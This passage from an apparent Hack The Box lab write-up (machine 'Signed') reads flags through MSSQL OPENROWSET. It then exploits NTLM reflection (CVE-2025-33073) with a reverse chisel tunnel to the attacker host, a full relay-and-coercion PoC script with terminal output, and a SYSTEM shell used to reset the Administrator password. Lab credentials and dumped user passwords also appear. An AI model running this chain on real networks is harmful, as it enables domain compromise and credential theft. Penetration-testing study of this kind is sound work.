-----------   --------------   --------------------------   
server                         ADMINISTER BULK OPERATIONS
```

There we go, we got the `ADMINISTER BULK OPERATIONS`. <br>
&rarr; We can now read the files but to do that, we need to enable [Ole Automation Procedures](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option?view=sql-server-ver17) as hackticks also gave out for our the commands to do so.

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> sp_configure 'show advanced options', 1
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE
SQL (SIGNED\mssqlsvc  dbo@master)> sp_configure 'Ole Automation Procedures', 1
INFO(DC01): Line 196: Configuration option 'Ole Automation Procedures' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE
```

Running the test to see if it works.

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
BulkColumn                                                                                                                                                                                                                                                        
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
b"# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\r\n#\r\n# This file contains the mappings of IP addresses to host names. Each\r\n# entry should be kept on an individual line. The IP address should\r\n# be placed in the first column followed by the corresponding host name.\r\n# The IP address and the host name should be separated by at least one\r\n# space.\r\n#\r\n# Additionally, comments (such as these) may be inserted on individual\r\n# lines or following the machine name denoted by a '#' symbol.\r\n#\r\n# For example:\r\n#\r\n#      102.54.94.97     rhino.acme.com          # source server\r\n#       38.25.63.10     x.acme.com              # x client host\r\n\r\n# localhost name resolution is handled within DNS itself.\r\n#\t127.0.0.1       localhost\r\n#\t::1             localhost\r\n"
```

So it works that we can see the content of `hosts` file. <br>
&rarr; Let's grab out `root.txt`.

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents
BulkColumn                                
---------------------------------------   
b'526074459ed87d99c3f3757b03e11d1f\r\n'
```

Down go the `root.txt` flag.

> *Thinking that if the root path is intended or not so we gonna try proxy back from the `mssqlsvc` footage and then doing more recon if there is some other exploit as well.*

## Extra
This part is what we will doing more ways to escalated to root.

### NTLM reflection (CVE-2025-33073)
We will start proxy with [chisel](https://github.com/jpillora/chisel). <br>
Go to the release and download then transfer to `mssqlsvc` session via `wget`. <br>
&rarr; After that start the chisel on our kali side.

```bash
└─$ chisel server --reverse --port 8000 --socks5
2025/10/16 10:58:49 server: Reverse tunnelling enabled
2025/10/16 10:58:49 server: Fingerprint 2UDN+fLU+yB27NCn3r34CkrzvDTeW+pBlGvz3PsAUhA=
2025/10/16 10:58:49 server: Listening on http://0.0.0.0:8000
```

Then run chisel on the `mssqlsvc` session to connect back to server side.

```bash
PS C:\Temp> .\chisel.exe client 10.10.16.35:8000 R:1080:socks
```

```bash
2025/10/16 10:59:04 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Now we can test for some common port.

```bash
└─$ sudo proxychains -q nmap -sV -sT -Pn -p 80,443,445,1433,3389,5985,5986,8080,8443,9090,10000 127.0.0.1
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 10:59 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (4.6s latency).

PORT      STATE  SERVICE          VERSION
80/tcp    closed http
443/tcp   closed https
445/tcp   open   microsoft-ds?
1433/tcp  open   ms-sql-s?
3389/tcp  closed ms-wbt-server
5985/tcp  closed wsman
5986/tcp  open   ssl/http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  closed zeus-admin
10000/tcp closed snet-sensor-mgmt
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 236.69 seconds
```

Seeing that port `5986` is open and port `5985` is closed. <br>
&rarr; Checkout [5985-5986-pentesting-winrm](https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html#recent-vulnerabilities--offensive-techniques-2021-2025) from hacktricks. <br>
From this point, thinking about if there is new cve 2025 that related to WS-MAN so taking some googling but ended up get nothing. <br>
Looking back at the machine title `Signed` so normal just `smb` but signing is active so that why we need to use `winrm` as we also found port related to. <br>
&rarr; Thinking about `NTLM reflection` that abuses the legitimate NTLM authentication that we need to actively relay it otherwise it was just a normal network traffic.

> *This is also a must check cause doing machine after machine, need to have some try and error so that we know what need to check and typical things to double check.*

```bash
└─# proxychains -q nxc smb 127.0.0.1 -u mssqlsvc -p 'purPLE9795!@' -M ntlm_reflection 
SMB         127.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         127.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
NTLM_REF... 127.0.0.1       445    DC01             VULNERABLE (can relay SMB to other protocols except SMB on 127.0.0.1)
```

So it got vulenrable due to `NTLM reflection`.

> *To understand more about this &rarr; Check out this [ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) aritcle.*

Taking some github POC for this related CVE and found this [CVE-2025-33073](https://github.com/mverschu/CVE-2025-33073).

### CVE-2025-33073 (Automated Script)
Take a look at options and we take first try see if it works or we need to modified something.

```bash
└─$ proxychains -q python3 CVE-2025-33073.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' --attacker-ip 10.10.16.35 --dns-ip 10.129.47.121 --dc-fqdn DC01.signed.htb --target 10.129.47.121 --target-ip 10.129.47.121 --cli-only
[*] Adding malicious DNS record using dnstool.py...
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
[+] DNS record added.
[*] Waiting for DNS record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb to propagate...
[+] DNS record is live.
[*] Starting ntlmrelayx listener in this terminal...
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] Triggering PetitPotam coercion via nxc...
[*] Running PetitPotam silently in this terminal...
[*] Exploit chain triggered.
[*] Running in CLI-only mode. Check this terminal for output.
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.47.121, attacking target smb://10.129.47.121
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[*] Authenticating against smb://10.129.47.121 as / SUCCEED
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from 10.129.47.121 controlled, but there are no more targets left!
```

So seems like the DNS part is good but the authentication it makes go with `smb` but we identified the vulnerable is related to `WS-MAN` which is `winrms`. <br>
&rarr; Need to modified the original script to match with our requirements.

```py
#!/usr/bin/env python3
import shlex
import sys
import argparse
import subprocess
import time

STATIC_DNS_RECORD = "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"

def run_dnstool(user, password, attacker_ip, dns_ip, dc_fqdn):
    print("[*] Adding malicious DNS record using dnstool.py...")
    dnstool_cmd = [
        "python3", "dnstool.py",
        "-u", user,
        "-p", password,
        "-a", "add",
        "-r", STATIC_DNS_RECORD,
        "-d", attacker_ip,
        "-dns-ip", dns_ip,
        dc_fqdn
    ]
    subprocess.run(dnstool_cmd, check=True)
    print("[+] DNS record added.")

def wait_for_dns_record(record, dns_ip, timeout=60):
    timeout = int(timeout)
    print(f"[*] Waiting for DNS record {record} to propagate...")
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            result = subprocess.run(
                ["dig", "+short", record, f"@{dns_ip}"],
                capture_output=True, text=True
            )
            if result.stdout.strip():
                print("[+] DNS record is live.")
                return True
        except Exception as e:
            print(f"[!] Error checking DNS record: {e}")
        time.sleep(2)
    print("[!] Timeout reached. DNS record not found.")
    return False

def start_ntlmrelayx(target, cli_only=False, custom_command=None, socks=False):
    if cli_only:
        print("[*] Starting ntlmrelayx listener in this terminal...")
        if custom_command:
            cmd = ["ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support", "-c", custom_command]
        else:
            cmd = ["ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support"]
        if socks:
            cmd.append("-socks")
        return subprocess.Popen(cmd)
    else:
        print("[*] Starting ntlmrelayx listener in a new xterm...")
        if custom_command:
            cmd = ["xterm", "-hold", "-e", "ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support", "-c", custom_command]
        else:
            cmd = ["xterm", "-hold", "-e", "ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support"]
        if socks:
            cmd.append("--socks")
        return subprocess.Popen(cmd)

def run_petitpotam(target_ip, domain, user, password, cli_only=False, method="PetitPotam"):
    print(f"[*] Triggering {method} coercion via nxc...")

    command_str = (
        f"nxc smb {target_ip} "
        f"-d {domain} "
        f"-u {user} "
        f"-p '{password}' "
        f"-M coerce_plus "
        f"-o M={method} L=\"{STATIC_DNS_RECORD}\""
    )

    if cli_only:
        print(f"[*] Running {method} silently in this terminal...")
        subprocess.Popen(
            command_str, 
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    else:
        print(f"[*] Running {method} in a new xterm...")
        subprocess.Popen(["xterm", "-e", "bash", "-c", command_str])

def main():
    parser = argparse.ArgumentParser(description="Ethical attack chain: dnstool + ntlmrelayx + coercion method")
    parser.add_argument("-u", "--username", required=True, help="Username (DOMAIN\\user)")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-d", "--attacker-ip", required=True, help="Attacker IP (Linux/Kali machine)")
    parser.add_argument("--dns-ip", required=True, help="IP of Domain Controller (DNS)")
    parser.add_argument("--dc-fqdn", required=True, help="FQDN of the Domain Controller")
    parser.add_argument("--target", required=True, help="Target machine for NTLM relay (FQDN)")
    parser.add_argument("--target-ip", required=True, help="IP of the coercion target (for nxc)")
    parser.add_argument("--cli-only", action="store_true", help="Run everything in CLI without opening xterm windows")
    parser.add_argument("--custom-command", help="Run custom command instead of secretsdump")
    parser.add_argument("--socks", action="store_true", help="Enable SOCKS proxy in ntlmrelayx")
    parser.add_argument("-M", "--method", default="PetitPotam", 
                        choices=["PetitPotam", "Printerbug", "DFSCoerce"],
                        help="Coercion method to use (default: PetitPotam)")
    args = parser.parse_args()

    # Step 1: Add DNS record (static record inside)
    run_dnstool(args.username, args.password, args.attacker_ip, args.dns_ip, args.dc_fqdn)

    # Step 2: Check if DNS record was added succesfully
    domain_name = ".".join(args.dc_fqdn.split(".")[1:])
    full_record = f"{STATIC_DNS_RECORD}.{domain_name}"
    if not wait_for_dns_record(full_record, args.dns_ip, timeout=60):
        print("[!] Exiting due to DNS record not being live.")
        sys.exit(1)
    
    # Step 3: Start ntlmrelayx listener
    ntlmrelay_proc = start_ntlmrelayx(args.target, args.cli_only, args.custom_command, args.socks)
    time.sleep(5)  # Give ntlmrelayx some time to start

    # Step 4: Trigger coercion method
    domain, user = args.username.split("\\", 1)
    run_petitpotam(args.target_ip, domain, user, args.password, args.cli_only, args.method)

    print("[*] Exploit chain triggered.")
    if args.cli_only:
        print("[*] Running in CLI-only mode. Check this terminal for output.")
        try:
            ntlmrelay_proc.wait()
        except KeyboardInterrupt:
            print("\n[*] Keyboard interrupt received. Stopping...")
            ntlmrelay_proc.terminate()
    else:
        print("[*] Check both terminals for output.")
        input("[*] Press Enter to stop ntlmrelayx listener...")
        ntlmrelay_proc.terminate()
        ntlmrelay_proc.wait()

if __name__ == "__main__":
    main()
```

Here is the script after modified.

```diff
--- Original
+++ Fixed
@@ -39,9 +39,9 @@
     if cli_only:
         print("[*] Starting ntlmrelayx listener in this terminal...")
         if custom_command:
- cmd = ["impacket-ntlmrelayx", "-t", target, "-smb2support", "-c", custom_command]
+            cmd = ["ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support", "-c", custom_command]
         else:
- cmd = ["impacket-ntlmrelayx", "-t", target, "-smb2support"]
+            cmd = ["ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support"]
         if socks:
             cmd.append("-socks")
         return subprocess.Popen(cmd)
@@ -49,9 +49,9 @@
         print("[*] Starting ntlmrelayx listener in a new xterm...")
         if custom_command:
- cmd = ["xterm", "-hold", "-e", "impacket-ntlmrelayx", "-t", target, "-smb2support", "-c", custom_command]
+            cmd = ["xterm", "-hold", "-e", "ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support", "-c", custom_command]
         else:
- cmd = ["xterm", "-hold", "-e", "impacket-ntlmrelayx", "-t", target, "-smb2support"]
+            cmd = ["xterm", "-hold", "-e", "ntlmrelayx.py", "-t", f"winrms://{target}", "-smb2support"]
         if socks:
             cmd.append("--socks")
         return subprocess.Popen(cmd)
```

Now running again and see if it works.

```bash
└─$ proxychains -q python3 CVE-2025-33073-winrm.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' --attacker-ip 10.10.16.35 --dns-ip 10.129.8.73 --dc-fqdn DC01.signed.htb --target DC01.signed.htb --target-ip 10.129.8.73 --cli-only                  
[*] Adding malicious DNS record using dnstool.py...
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[!] Record already exists and points to 10.10.16.35. Use --action modify to overwrite or --allow-multiple to override this
[+] DNS record added.
[*] Waiting for DNS record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb to propagate...
[+] DNS record is live.
[*] Starting ntlmrelayx listener in this terminal...
Impacket v0.13.0.dev0+20250930.122532.914efa53 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] Triggering PetitPotam coercion via nxc...
[*] Running PetitPotam silently in this terminal...
[*] Exploit chain triggered.
[*] Running in CLI-only mode. Check this terminal for output.
[*] (SMB): Received connection from 10.129.8.73, attacking target winrms://DC01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.8.73 against winrms://DC01.signed.htb SUCCEED [1]
[*] winrms:///@dc01.signed.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] (SMB): Received connection from 10.129.8.73, attacking target winrms://DC01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.8.73 against winrms://DC01.signed.htb SUCCEED [2]
[*] winrms:///@dc01.signed.htb [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001
[*] winrms:///@dc01.signed.htb [1] -> WinRM shell destroyed successfully. You can now leave the NC shell :)
```

That's is a good sign that it works match our needs.

> *Also need to mention that is one working cause I am doing in the virtual environment cause the stable `ntlmrelayx` is not meet our needs so need to update to the lastest dev version.*

Here is how we do to update [impacket](https://github.com/fortra/impacket) to the lastest version.

```bash
└─$ git clone https://github.com/SecureAuthCorp/impacket.git         

└─$ cd impacket 

# list the branches
└─$ git branch
* master

# search all branches for winrms matches
└─$ git branch -a | grep -i winrms
  remotes/origin/fix_ntlmrelayx_winrmsattack

# create and switch to fix_ntlmrelayx_winrmsattack branch
└─$ git checkout -b fix_ntlmrelayx_winrmsattack origin/fix_ntlmrelayx_winrmsattack
branch 'fix_ntlmrelayx_winrmsattack' set up to track 'origin/fix_ntlmrelayx_winrmsattack'.
Switched to a new branch 'fix_ntlmrelayx_winrmsattack'

# create python virtual environment
└─$ python3 -m venv impacket-venv

# activate
└─$ source impacket-venv/bin/activate

# install packages
└─$ pip install -e .
```

```bash
# verify the new version
└─$ ntlmrelayx.py -h
Impacket v0.13.0.dev0+20250930.122532.914efa53
```

Continue the process of the script, we got interactive WinRMS shell open at `127.0.0.1:11000`.

```bash
└─$ nc 127.0.0.1 11000
Type help for list of commands

# whoami
nt authority\system
```

We are now at the highest privilege. <br>
&rarr; Now we can change the administrator password and `evil-winrm` inside.

```bash
# net user Administrator p@ssw4rd$
The command completed successfully.
```

```bash
└─$ proxychains -q evil-winrm -i 127.0.0.1 -u Administrator -p 'p@ssw4rd$' -S -P 5986                                                                    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/15/2025   9:12 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
8d5188bbc8842951eb4014db84f37a7e
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Got into `Administrator` and grab `root.txt` flag. <br>
But if we want to do manually to understand more what process is doing, we can check out this blog again [ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) and doing manually.

### CVE-2025-33073 (Manually)
For our step 1, we need to add DNS record to DC01.

```bash
└─$ proxychains -q python3 dnstool.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' DC01.signed.htb -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.16.35 -dns-ip 127.0.0.1 --tcp
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
```

Then step 2, we need to verify DNS record exists.

```bash
└─$ proxychains -q python3 dnstool.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' 10.129.47.121 -a query -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.16.35 -dns-ip 127.0.0.1 --tcp
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
DC=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA,DC=SIGNED.HTB,CN=MicrosoftDNS,DC=DomainDnsZones,DC=SIGNED,DC=HTB
Record is tombStoned (inactive)
[+] Record entry:
 - Type: 1 (A) (Serial: 267)
 - Address: 10.10.16.35
DC=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA,DC=SIGNED.HTB,CN=MicrosoftDNS,DC=DomainDnsZones,DC=SIGNED,DC=HTB
Record is tombStoned (inactive)
[+] Record entry:
 - Type: 0 (ZERO) (Serial: 264)
 - Tombstoned at: 2025-10-17 03:12:34.218154
```

We are either verify with `dnstool.py` or with `dig` as well.

```bash
└─$ proxychains -q dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @dc01.signed.htb +tcp                            

; <<>> DiG 9.20.11-4+b1-Debian <<>> localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @dc01.signed.htb +tcp
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48826
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. IN A

;; ANSWER SECTION:
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. 180 IN A 10.10.16.35

;; Query time: 418 msec
;; SERVER: 224.0.0.1#53(dc01.signed.htb) (TCP)
;; WHEN: Fri Oct 17 01:10:56 EDT 2025
;; MSG SIZE  rcvd: 109
```

See that our `tun0` is add correctly as shown. <br>
For step 3, we now start `ntlmrelayx`.

```bash
└─$ proxychains ntlmrelayx.py -smb2support -t 'winrms://dc01.signed.htb'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20250930.122532.914efa53 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Servers started, waiting for connections
```

> *Be aware that the `ntlmrelayx.py` we using is the lastest version so need to setup virtual environment to do this so if checking our version and still stable one, better update it up.*

Finally, to trigger the authentication, we will using `coerce` or even `PetitPotam` or other. <br>
&rarr; We will be using `coerce`.

```bash
└─$ proxychains -q nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA             
SMB         224.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         224.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, netdfs\NetrDfsAddStdRoot
COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, MSEven
COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, eventlog\ElfrOpenBELW
```

After that, checking back the connections.

```bash
[*] (SMB): Received connection from 10.129.47.121, attacking target winrms://dc01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.47.121 against winrms://dc01.signed.htb SUCCEED [1]
[*] winrms:///@dc01.signed.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] All targets processed!
[*] (SMB): Connection from 10.129.47.121 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.129.47.121 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.129.47.121 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.129.47.121 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.129.47.121 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.129.47.121 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.129.47.121 controlled, but there are no more targets left!
[*] winrms:///@dc01.signed.htb [1] -> WinRM shell destroyed successfully. You can now leave the NC shell :)
```

Notice that there is shell on `127.0.0.1:11000`. <br>
From here we can do the same from the automated script part that just change `Administrator` password and connection via `evil-winrm` to grab `root.txt` flag or just read out the flag straight from the shell :D.

### PS history
For this part, it connectinue the process that when we forge silver ticket the `Domain Admins` and `Enterprise Admins` to `mssqlsvc`. <br>
&rarr; We then enable `OPENROWSET` to read out the administrator PS history.

> *Check out this [basic-powershell-for-pentesters](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html?highlight=powershell%20history#ps-history).*

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents
BulkColumn                                                                                                                                                                                                                                                        
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
b'# Domain`\n$Domain = "signed.htb"`\n`\n# Groups`\n$Groups = @("HR","IT","Finance","Developers","Support")`\n`\nforeach ($grp in $Groups) {`\n    if (-not (Get-ADGroup -Filter "Name -eq \'$grp\'" -ErrorAction SilentlyContinue)) {`\n        New-ADGroup -Name $grp -GroupScope Global -GroupCategory Security`\n    }`\n}`\n`\n# Users: Username, Password, Group`\n$Users = @(`\n    @{Username="oliver.mills";       Password="!Abc987321$"; Group="HR"},`\n    @{Username="emma.clark";         Password="!Xyz654789#"; Group="HR"},`\n    @{Username="liam.wright";        Password="!Qwe123789&"; Group="HR"},`\n`\n    @{Username="noah.adams";         Password="!ItDev456$"; Group="IT"},`\n    @{Username="ava.morris";         Password="!ItDev789#"; Group="IT"},`\n`\n    @{Username="sophia.turner";      Password="!Fin987654$"; Group="Finance"},`\n    @{Username="james.morgan";       Password="!Fin123987#"; Group="Finance"},`\n    @{Username="mia.cooper";         Password="!Fin456321&"; Group="Finance"},`\n`\n    @{Username="elijah.brooks";      Password="!Dev123456$"; Group="Developers"},`\n    @{Username="isabella.evans";     Password="!Dev789654#"; Group="Developers"},`\n    @{Username="lucas.murphy";       Password="!Dev321987&"; Group="Developers"},`\n    @{Username="william.johnson";    Password="!ItDev321&"; Group="Developers"},`\n`\n    @{Username="charlotte.price";    Password="!Sup123456$"; Group="Support"},`\n    @{Username="henry.bennett";      Password="!Sup654321#"; Group="Support"},`\n    @{Username="amelia.kelly";       Password="!Sup987123&"; Group="Support"},`\n    @{Username="jackson.gray";       Password="!Sup321654$"; Group="Support"},`\n    @{Username="harper.diaz";        Password="!Sup789321#"; Group="Support"}`\n)`\n`\nforeach ($u in $Users) {`\n    if (-not (Get-ADUser -Filter "SamAccountName -eq \'$($u.Username)\'" -ErrorAction SilentlyContinue)) {`\n        New-ADUser -Name $u.Username ``\n            -SamAccountName $u.Username ``\n            -UserPrincipalName "$($u.Username)@$Domain" ``\n            -AccountPassword (ConvertTo-SecureString $u.Password -AsPlainText -Force) ``\n            -Enabled $true ``\n            -PasswordNeverExpires $true`\n`\n        Add-ADGroupMember -Identity $u.Group -Members $u.Username`\n    }`\n}\r\nInvoke-WebRequest -Uri "https://go.microsoft.com/fwlink/?linkid=2215202&clcid=0x409&culture=en-us&country=us" -OutFile "C:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe"\r\nC:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe\r\ncd \\\r\ndir\r\ncd .\\SQL2022\\\r\ndir\r\ncd .\\Evaluation_ENU\\\r\ndir\r\n.\\SETUP.EXE /ACTION=Install\r\nget-service -Name 